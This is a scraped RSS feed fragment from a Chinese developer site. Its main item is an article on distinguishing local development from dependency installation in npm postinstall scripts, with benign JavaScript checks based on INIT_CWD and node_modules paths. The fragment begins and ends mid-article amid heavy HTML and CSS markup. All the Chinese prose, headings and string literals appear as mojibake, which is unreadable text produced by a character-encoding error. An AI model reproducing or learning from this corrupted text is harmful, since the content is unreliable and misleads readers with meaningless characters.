<p>æœ¬é¡¹ç›®çš„æ–‡æœ¬ç¼–ç è½¬æ¢å™¨é€šè¿‡å……åˆ†åˆ©ç”¨ <code>TextEncoder</code>/<code>TextDecoder</code>ã€<code>URL</code> API ä»¥åŠ ES6+ çš„å­—ç¬¦ä¸²å¤„ç†ç‰¹æ€§ï¼ˆå¦‚ <code>codePointAt</code>ã€<code>for...of</code>ï¼‰ï¼Œä»¥åŸç”Ÿ JavaScript å®ç°äº†é«˜æ•ˆã€è½»é‡çš„å¤šæ ¼å¼è½¬æ¢ï¼Œæ— éœ€ä¾èµ–ä»»ä½•é‡å‹ç¬¬ä¸‰æ–¹åº“ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[NPM è„šæœ¬é¿å‘æŒ‡å—ï¼šå¦‚ä½•ä¼˜é›…åœ°åŒºåˆ† postinstall çš„â€œå¼€å‘â€ä¸â€œå®‰è£…â€ç¯å¢ƒï¼Ÿ]]></title>    <link>https://juejin.cn/post/7601007650722791465</link>    <guid>https://juejin.cn/post/7601007650722791465</guid>    <pubDate>2026-01-30T14:28:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601007650722791465" data-draft-id="7597058281434169398" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="NPM è„šæœ¬é¿å‘æŒ‡å—ï¼šå¦‚ä½•ä¼˜é›…åœ°åŒºåˆ† postinstall çš„â€œå¼€å‘â€ä¸â€œå®‰è£…â€ç¯å¢ƒï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,Node.js,ä»£ç è§„èŒƒ"/> <meta itemprop="datePublished" content="2026-01-30T14:28:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="donecoding"/> <meta itemprop="url" content="https://juejin.cn/user/3192637500430093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            NPM è„šæœ¬é¿å‘æŒ‡å—ï¼šå¦‚ä½•ä¼˜é›…åœ°åŒºåˆ† postinstall çš„â€œå¼€å‘â€ä¸â€œå®‰è£…â€ç¯å¢ƒï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3192637500430093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    donecoding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T14:28:59.000Z" title="Fri Jan 30 2026 14:28:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å‰è¨€</p>
</blockquote>
<p>ä½ æ˜¯å¦é‡åˆ°è¿‡è¿™æ ·çš„å°´å°¬ï¼šç»™åŒ…å†™äº†ä¸€ä¸ªÂ <code>postinstall</code>Â é’©å­å»åšè‡ªåŠ¨æ„å»ºï¼ˆå¦‚ç¼–è¯‘ C++ æ¨¡å—æˆ–ç”Ÿæˆåè®®æ–‡ä»¶ï¼‰ï¼Œç»“æœè‡ªå·±æœ¬åœ°å¼€å‘è·‘Â <code>pnpm install</code>Â æ—¶ï¼Œå®ƒä¹Ÿè·Ÿç€åœ¨é‚£ç¼–è¯‘åŠå¤©ï¼Œç”šè‡³å› ä¸ºç¯å¢ƒé—®é¢˜æŠ¥é”™å¡æ­»ï¼Ÿ</p>
<p>åŒºåˆ†â€œå®¿ä¸»å¼€å‘â€ä¸â€œä¾èµ–å®‰è£…â€ç¯å¢ƒæ˜¯æ¯ä¸ªåŒ…ä½œè€…çš„å¿…ä¿®è¯¾ã€‚æœ¬æ–‡å°†ä»ç¯å¢ƒå˜é‡åˆ°è·¯å¾„ç‰¹å¾è¿›è¡Œå…¨æ–¹ä½æ‹†è§£ï¼Œå¸¦ä½ ç”±æµ…å…¥æ·±å¯»æ‰¾æœ€ä¼˜è§£ã€‚</p>
<blockquote>
<p><strong>ğŸš€ å¦‚æœä½ ç°åœ¨æ­£æ€¥ç€è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</strong><br/>
è¯·ç›´æ¥è·³è½¬åˆ°Â <strong>æ–¹æ¡ˆä¸‰ï¼šç‰¹å¾è·¯å¾„æ‰«ææ³•</strong>ã€‚è¿™æ˜¯ç›®å‰åœ¨ç‹¬ç«‹åŒ…ã€Monorepo ä»¥åŠè·¨å¹³å°åœºæ™¯ä¸‹é²æ£’æ€§æœ€å¼ºã€æœ€é€šç”¨çš„è§£å†³æ–¹æ¡ˆã€‚</p>
</blockquote>
<hr/>
<p>æ–¹æ¡ˆä¸€ï¼šåŸºç¡€è·¯å¾„æ¯”å¯¹æ³•ï¼ˆINIT_CWDï¼‰</p>
<p>è¿™æ˜¯æœ€ç›´è§‚çš„æ–¹æ¡ˆï¼Œåˆ©ç”¨ npm/pnpm æ³¨å…¥çš„ç¯å¢ƒå˜é‡Â <code>INIT_CWD</code>ã€‚</p>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// scripts/postinstall.js</span>
<span class="hljs-type">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-keyword">if</span> (process.env.INIT_CWD &amp;&amp; path.<span class="hljs-built_in">resolve</span>(process.env.INIT_CWD) === path.<span class="hljs-built_in">resolve</span>(process.<span class="hljs-built_in">cwd</span>())) {
  console.<span class="hljs-built_in">log</span>(<span class="hljs-string">'å®¿ä¸»å¼€å‘ç¯å¢ƒï¼Œè·³è¿‡è„šæœ¬'</span>);
  process.<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}
</code></pre>
<p>è¯·è°¨æ…ä½¿ç”¨æ­¤ç±»ä»£ç ã€‚</p>
<ul>
<li>
<p><strong>åŸç†è§£æ</strong>ï¼š<code>INIT_CWD</code>Â æ˜¯ä½ æ•²ä¸‹å®‰è£…å‘½ä»¤æ—¶çš„è·¯å¾„ï¼Œ<code>process.cwd()</code>Â æ˜¯è„šæœ¬æ‰§è¡Œæ—¶çš„è·¯å¾„ã€‚åœ¨æœ€ç®€å•çš„ç‹¬ç«‹åŒ…å¼€å‘ä¸­ï¼Œè¿™ä¸¤ä¸ªè·¯å¾„é€šå¸¸æ˜¯ä¸€è‡´çš„ã€‚</p>
</li>
<li>
<p><strong>å±€é™æ€§</strong>ï¼š</p>
<ul>
<li><strong>Monorepo æ€æ‰‹</strong>ï¼šåœ¨ Monorepo æ¶æ„ä¸­ï¼Œä½ åœ¨æ ¹ç›®å½•è¿è¡ŒÂ <code>pnpm i</code>ï¼Œ<code>INIT_CWD</code>Â æŒ‡å‘é¡¹ç›®æ ¹ç›®å½•ï¼Œä½†å­åŒ…è„šæœ¬æ‰§è¡Œæ—¶Â <code>cwd</code>Â æŒ‡å‘Â <code>packages/xxx</code>ï¼Œä¸¤è€…æ°¸è¿œä¸ç›¸ç­‰ï¼Œå¯¼è‡´æ‹¦æˆªå¤±æ•ˆã€‚</li>
<li><strong>è½¯é“¾æ¥é£é™©</strong>ï¼šåœ¨æŸäº› OS æˆ–ç‰¹å®šåŒ…ç®¡ç†å™¨ä¸‹ï¼Œè·¯å¾„çš„å¤§å°å†™æˆ–ç‰©ç†é“¾æ¥è§£æå¯èƒ½ä¸ä¸€è‡´ï¼Œå¯¼è‡´æ¯”å¯¹å¤±è´¥ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<p>æ–¹æ¡ˆäºŒï¼šé…ç½®æ ‡å¿—ä½æ³•ï¼ˆnpm_config_*ï¼‰</p>
<p>é€šè¿‡åŒ…ç®¡ç†å™¨æ³¨å…¥çš„ç¯å¢ƒå˜é‡æ¥åˆ¤æ–­å½“å‰çš„å®‰è£…è¡Œä¸ºã€‚</p>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">if</span> (process.env.npm_config_global) {
  <span class="hljs-comment">// åªæœ‰å…¨å±€å®‰è£…ï¼ˆ-gï¼‰æ—¶æ‰§è¡Œ</span>
}
</code></pre>
<p>è¯·è°¨æ…ä½¿ç”¨æ­¤ç±»ä»£ç ã€‚</p>
<ul>
<li>
<p><strong>åŸç†è§£æ</strong>ï¼šåˆ©ç”¨åŒ…ç®¡ç†å™¨åœ¨æ‰§è¡Œè„šæœ¬æ—¶æ³¨å…¥çš„Â <code>npm_config_</code>Â ç³»åˆ—å˜é‡ã€‚</p>
</li>
<li>
<p><strong>å±€é™æ€§</strong>ï¼š</p>
<ul>
<li><strong>ç²’åº¦å¤ªç²—</strong>ï¼šå®ƒèƒ½åŒºåˆ†â€œå…¨å±€â€è¿˜æ˜¯â€œæœ¬åœ°â€ï¼Œä½†æ— æ³•åŒºåˆ†â€œæœ¬åœ°å¼€å‘æºç â€è¿˜æ˜¯â€œä½œä¸ºä»–äººé¡¹ç›®çš„é¡¹ç›®ä¾èµ–â€ã€‚</li>
<li><strong>å…¼å®¹æ€§ç¢ç‰‡åŒ–</strong>ï¼šnpmã€yarnã€pnpm å¯¹è¿™äº›å˜é‡çš„æ³¨å…¥è§„åˆ™åœ¨ 2026 å¹´ä¾ç„¶å­˜åœ¨ç»†å¾®å·®å¼‚ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<p>æ–¹æ¡ˆä¸‰ï¼šç‰¹å¾è·¯å¾„æ‰«ææ³•ï¼ˆå…¨åœºæœ€ä½³ï¼‰</p>
<p>è¿™æ˜¯ç›®å‰å¥å£®æ€§æœ€é«˜ã€ä¹Ÿæ˜¯ç¤¾åŒºæœ€æ¨å´‡çš„æ–¹æ¡ˆã€‚å®ƒçš„é€»è¾‘éå¸¸çº¯ç²¹ï¼š<strong>æ£€æŸ¥å½“å‰è„šæœ¬æ‰§è¡Œçš„ç‰©ç†è·¯å¾„ä¸­æ˜¯å¦åŒ…å«Â <code>node_modules</code>ã€‚</strong></p>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
<span class="hljs-type">const</span> cwd = process.<span class="hljs-built_in">cwd</span>();

<span class="hljs-comment">// æ ¸å¿ƒé€»è¾‘ï¼šæ£€æŸ¥è·¯å¾„ç‰‡æ®µä¸­æ˜¯å¦åŒ…å«æ ‡å‡†çš„ node_modules ç›®å½•å</span>
<span class="hljs-type">const</span> isDependency = cwd.<span class="hljs-built_in">split</span>(path.sep).<span class="hljs-built_in">includes</span>(<span class="hljs-string">'node_modules'</span>);

<span class="hljs-keyword">if</span> (!isDependency) {
    console.<span class="hljs-built_in">log</span>(<span class="hljs-string">"ğŸš€ æ£€æµ‹åˆ°å¤„äºæºç å¼€å‘ç¯å¢ƒï¼ˆç‹¬ç«‹åŒ…æˆ– Monorepoï¼‰ï¼Œæ‹¦æˆª postinstall"</span>);
    process.<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}

<span class="hljs-comment">// åªæœ‰è¢«åˆ«äºº add ä¹‹åï¼Œä½ çš„åŒ…æ‰ä¼šå‡ºç°åœ¨ node_modules é‡Œ</span>
console.<span class="hljs-built_in">log</span>(<span class="hljs-string">"ğŸ“¦ æ­£åœ¨ä½œä¸ºä¾èµ–å®‰è£…ï¼Œæ‰§è¡Œåˆå§‹åŒ–é€»è¾‘..."</span>);
</code></pre>
<p>è¯·è°¨æ…ä½¿ç”¨æ­¤ç±»ä»£ç ã€‚</p>
<ul>
<li>
<p><strong>ä¸ºä»€ä¹ˆå®ƒæ—¢æ”¯æŒç‹¬ç«‹åŒ…åˆæ”¯æŒ Monorepoï¼Ÿ</strong></p>
<ul>
<li><strong>ç‹¬ç«‹åŒ…å¼€å‘</strong>ï¼šä½ çš„è·¯å¾„æ˜¯Â <code>/User/dev/my-pkg</code>ï¼Œä¸å«Â <code>node_modules</code>ã€‚æ‹¦æˆªæˆåŠŸã€‚</li>
<li><strong>Monorepo å¼€å‘</strong>ï¼šä½ çš„å­åŒ…è·¯å¾„æ˜¯Â <code>/User/dev/repo/packages/my-pkg</code>ï¼Œä¾ç„¶ä¸å«Â <code>node_modules</code>ã€‚æ‹¦æˆªæˆåŠŸã€‚</li>
<li><strong>åˆ«äººå®‰è£…æ—¶</strong>ï¼šæ— è®ºå¯¹æ–¹æ€ä¹ˆé…ç½®ï¼Œä½ çš„åŒ…ä¸€å®šä¼šè¢«æ”¾ç½®åœ¨å¯¹æ–¹é¡¹ç›®çš„æŸä¸ªÂ <code>node_modules</code>Â ç›®å½•ä¸‹ã€‚è·¯å¾„å¿…å«è¯¥å…³é”®å­—ã€‚é€»è¾‘è§¦å‘ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¼˜åŠ¿</strong>ï¼šå®Œç¾è§„é¿äº†Â <code>INIT_CWD</code>Â åœ¨å¤§ä»“ä¸­çš„è·¯å¾„åç§»é—®é¢˜ã€‚</p>
</li>
</ul>
<hr/>
<p>æ–¹æ¡ˆå››ï¼š2026 ç°ä»£åŒ…ç®¡ç†å™¨é…ç½®æ³•ï¼ˆpnpm è§†è§’ï¼‰</p>
<p>å¦‚æœä½ å’Œä½ çš„ç”¨æˆ·ç¾¤ä½“ä¸»è¦ä½¿ç”¨Â <strong>pnpm v10+</strong> ï¼Œé™¤äº†ä»£ç å±‚é¢çš„æ‹¦æˆªï¼Œè¿˜å¯ä»¥åˆ©ç”¨ pnpm çš„å®‰å…¨æœºåˆ¶ã€‚</p>
<p>pnpm v10 é»˜è®¤ä¼šæ‹¦æˆªæœªçŸ¥çš„æ„å»ºè„šæœ¬ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œä½ å¯ä»¥åœ¨é¡¹ç›®çš„Â <code>.npmrc</code>Â ä¸­é€šè¿‡Â <code>only-built-dependencies</code>Â æ˜¾å¼æ§åˆ¶ã€‚ä½†ä¸ºäº†ç»™ç”¨æˆ·æä¾›â€œå¼€ç®±å³ç”¨â€çš„ä½“éªŒï¼Œåœ¨è„šæœ¬å†…éƒ¨é€šè¿‡Â <strong>æ–¹æ¡ˆä¸‰</strong>Â è¿›è¡Œé™é»˜æ‹¦æˆªä¾ç„¶æ˜¯æœ€ä½³å®è·µã€‚</p>
<hr/>
<p>æ€»ç»“ï¼šæˆ‘è¯¥é€‰å“ªç§ï¼Ÿ</p>
<p>æ ¹æ® 2026 å¹´çš„å¼€å‘æ ‡å‡†ï¼Œå»ºè®®åœ¨ä½ çš„Â <code>postinstall.js</code>Â ä¸­ä½¿ç”¨ä»¥ä¸‹ç»ˆæå…¼å®¹ä»£ç ï¼š</p>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-function">function <span class="hljs-title">shouldSkip</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-type">const</span> initCwd = process.env.INIT_CWD;
  <span class="hljs-type">const</span> cwd = process.<span class="hljs-built_in">cwd</span>();

  <span class="hljs-comment">// 1. å°è¯• INIT_CWD æ¯”å¯¹ï¼ˆè¦†ç›– 90% ç®€å•åœºæ™¯ï¼‰</span>
  <span class="hljs-keyword">if</span> (initCwd &amp;&amp; path.<span class="hljs-built_in">resolve</span>(initCwd) === path.<span class="hljs-built_in">resolve</span>(cwd)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;

  <span class="hljs-comment">// 2. ç‰¹å¾è·¯å¾„æ‰«æï¼ˆè¦†ç›– Monorepo å’Œ ç¬¦å·é“¾æ¥åœºæ™¯ï¼‰</span>
  <span class="hljs-comment">// åªè¦è·¯å¾„é‡Œæ²¡å‡ºç° node_modulesï¼Œå°±åˆ¤å®šä¸ºæ˜¯åœ¨è‡ªå·±å®¶å¼€å‘</span>
  <span class="hljs-keyword">if</span> (!cwd.<span class="hljs-built_in">split</span>(path.sep).<span class="hljs-built_in">includes</span>(<span class="hljs-string">'node_modules'</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;

  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

<span class="hljs-keyword">if</span> (<span class="hljs-built_in">shouldSkip</span>()) {
  process.<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}

<span class="hljs-comment">// ... æ‰§è¡ŒçœŸæ­£çš„é€»è¾‘</span>
</code></pre>
<p>è¯·è°¨æ…ä½¿ç”¨æ­¤ç±»ä»£ç ã€‚</p>
<p>å†™åœ¨æœ€å</p>
<p>ä¸€ä¸ªä¼˜ç§€çš„ NPM åŒ…ä¸ä»…è¦æœ‰å¼ºå¤§çš„åŠŸèƒ½ï¼Œè¿˜è¦æœ‰â€œä¸æ‰“æ‰°â€çš„è‡ªä¿®å…»ã€‚é€šè¿‡ç®€å•çš„å‡ è¡Œç¯å¢ƒåˆ¤æ–­ï¼Œä½ å¯ä»¥è®©ä½ çš„åŒ…åœ¨å¼€å‘é˜¶æ®µè½»é‡å¦‚åˆï¼Œè€Œåœ¨ç”Ÿäº§å®‰è£…æ—¶ç¨³å¦‚æ³°å±±ã€‚</p>
<p>å¦‚æœä½ è§‰å¾—è¿™ç¯‡æ–‡ç« è§£å†³äº†ä½ çš„ç‡ƒçœ‰ä¹‹æ€¥ï¼Œæ¬¢è¿ç‚¹èµæ”¶è—ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ¯”é»„é‡‘æš´è·Œæ›´éš¾è¿‡çš„æ˜¯ Vue 3.6 æ„å»ºå·¥å…·å…¨çº¿æ¢æˆ Rolldown äº†ğŸ˜°]]></title>    <link>https://juejin.cn/post/7600989427906199606</link>    <guid>https://juejin.cn/post/7600989427906199606</guid>    <pubDate>2026-01-31T03:41:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600989427906199606" data-draft-id="7601028900886609966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ¯”é»„é‡‘æš´è·Œæ›´éš¾è¿‡çš„æ˜¯ Vue 3.6 æ„å»ºå·¥å…·å…¨çº¿æ¢æˆ Rolldown äº†ğŸ˜°"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-31T03:41:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="VaJoy"/> <meta itemprop="url" content="https://juejin.cn/user/800100193674760"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ¯”é»„é‡‘æš´è·Œæ›´éš¾è¿‡çš„æ˜¯ Vue 3.6 æ„å»ºå·¥å…·å…¨çº¿æ¢æˆ Rolldown äº†ğŸ˜°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/800100193674760/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    VaJoy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T03:41:32.000Z" title="Sat Jan 31 2026 03:41:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul 